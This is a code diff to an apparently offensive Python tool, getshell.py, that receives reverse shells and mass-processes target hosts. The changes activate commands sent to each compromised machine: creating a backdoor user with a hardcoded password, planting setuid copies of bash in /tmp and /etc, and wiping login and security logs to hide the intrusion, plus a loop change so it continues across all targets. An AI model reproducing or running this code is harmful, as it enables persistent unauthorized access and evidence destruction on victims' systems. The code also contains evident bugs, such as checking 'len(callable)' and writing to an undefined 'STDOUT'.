@@ -3,6 +3,7 @@ import getopt
 import sys
 import threading
 import subprocess
+import random
 
 import requests
 import urllib3
@@ -23,8 +24,7 @@ pas = 'Pang@sec567'
 
 def usage():
     print("\n\nWelcome opang nc listen to get shell tools!")
-
-    print(r'''
+    p = r'''
                                            
     ____  ____ _____  ____ _________  _____
    / __ \/ __ `/ __ \/ __ `/ ___/ _ \/ ___/
@@ -32,7 +32,18 @@ def usage():
  / .___/\__,_/_/ /_/\__, /____/\___/\___/  
 /_/                /____/                  
 
-    ''')
+    '''
+    h = r'''
+    
+           _ __         _ __                 
+    ____  (_) /______  (_) /__________  _____
+   / __ \/ / //_/ __ \/ / //_/ ___/ _ \/ ___/
+  / /_/ / / ,< / /_/ / / ,< (__  )  __/ /__  
+ / .___/_/_/|_/ .___/_/_/|_/____/\___/\___/  
+/_/          /_/                             
+
+    '''
+    print(random.choice([p, h]))
     print("\nUsage: python getshell.py -t target_host -p port")
     print("-I --IP              - the host IP to listen rebound shell")
     print("-p --port            - the target port")
@@ -84,22 +95,26 @@ def print_command(conn):
         try:
             callback = conn.recv(1024)
             if len(callable) != 0:
-                print(callback)
+                STDOUT.write(callback)
+                stdout.flush()
+            else:
+                raise socket.error
         except:
-            print("Connect wrong")
+            # print("Connect wrong")
+            pass
 
 
 def client_handler(conn):
     if command:
-        threading._start_new_thread(print_command, (conn,))
-        conn.send(bytes("adduser -H {};\n{};\n{};\n\n".format(user, pas, pas), encoding='utf-8'))
-        # conn.send(bytes("userdel {}\n\n".format(user), encoding='utf-8'))
-        # conn.send(bytes("useradd -M -p `openssl passwd -1 -salt 'KakDox89' {}` {}\n\n".format(pas, user), encoding='utf-8'))
-        # conn.send(bytes('cp /bin/bash /tmp/shell && chmod u+s /tmp/shell\n\n', encoding='utf-8'))
-        # conn.send(bytes('cp /bin/bash /etc/shell && chmod u+s /etc/shell\n\n', encoding='utf-8'))
-        # conn.send(bytes('echo "AllowUsers {}" >> /etc/ssh/sshd_config && systemctl restart sshd\n\n'.format(user), encoding='utf-8'))
-        # conn.send(bytes('echo > /var/log/btmp; echo > /var/log/wtmp; echo > /var/log/secure; cat /dev/null > /var/spool/mail/root\n\n', encoding='utf-8'))
-        # conn.send(bytes('exit\n\n', encoding='utf-8'))
+        # threading._start_new_thread(print_command, (conn,))
+        # conn.send(bytes("deluser {}\n\n".format(user), encoding='utf-8'))
+        # conn.send(bytes("adduser -H {};\n{};\n{};\n\n".format(user, pas, pas), encoding='utf-8'))
+        conn.send(bytes("userdel {}\n\n".format(user), encoding='utf-8'))
+        conn.send(bytes("useradd -M -p `openssl passwd -1 -salt 'KakDox89' {}` {}\n\n".format(pas, user), encoding='utf-8'))
+        conn.send(bytes('cp /bin/bash /tmp/shell && chmod u+s /tmp/shell\n\n', encoding='utf-8'))
+        conn.send(bytes('cp /bin/bash /etc/shell && chmod u+s /etc/shell\n\n', encoding='utf-8'))
+        conn.send(bytes('echo > /var/log/btmp; echo > /var/log/wtmp; echo > /var/log/secure; cat /dev/null > /var/spool/mail/root\n\n', encoding='utf-8'))
+        conn.send(bytes('exit\n\n', encoding='utf-8'))
         print("get shell")
 
 def test_ssh(host, username, passwd):
@@ -148,7 +163,7 @@ def loop():
         try:
             su = ncwebshell('http://{ip}:{port}'.format(ip=ip,port=rport),username, password)
             if su == 200:
-                print(su)
+                print('{} {}'.format(su, ip))
         except:
             print("su error!")
                 # break
@@ -162,7 +177,6 @@ def loop():
                 print("ssh sign in false!")
         outputfile.close()
         print('========================')
-        break
     print("Done")
     
     exit(0)
